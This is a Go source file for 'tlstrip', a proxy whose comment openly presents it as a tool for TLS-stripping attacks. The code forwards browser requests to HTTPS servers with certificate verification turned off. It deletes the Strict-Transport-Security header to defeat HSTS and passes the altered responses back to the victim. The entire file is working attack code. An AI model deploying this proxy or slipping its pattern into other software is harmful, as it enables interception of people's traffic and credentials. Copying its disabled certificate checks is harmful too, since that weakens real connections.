/*
Tlstrip is a proxy server for TLS-stripping attacks.
It avoids HSTS protection mechanism by removing "Strict-Transport-Security"
header from remote server's response.

Without an explicit address, it listens on all host's addresses, port 8181.

Usage:
	tlstrip [address]
*/
package main

import (
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"os"
)

func main() {
	addr := ":8181"
	if len(os.Args) == 2 {
		addr = os.Args[1]
	}
	log.Println("Listening on", addr)
	log.Fatal(http.ListenAndServe(addr, http.HandlerFunc(proxy)))
}

func proxy(w http.ResponseWriter, r *http.Request) {
	url := "https://" + r.URL.Host + r.URL.Path
	req, err := http.NewRequest(r.Method, url, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	for k, v := range r.Header {
		for _, s := range v {
			req.Header.Add(k, s)
		}
	}
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	client := &http.Client{Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	resp.Header.Del("Strict-Transport-Security")
	header := w.Header()
	for k, v := range resp.Header {
		for _, s := range v {
			header.Add(k, s)
		}
	}
	w.WriteHeader(resp.StatusCode)
	io.Copy(w, resp.Body)
}
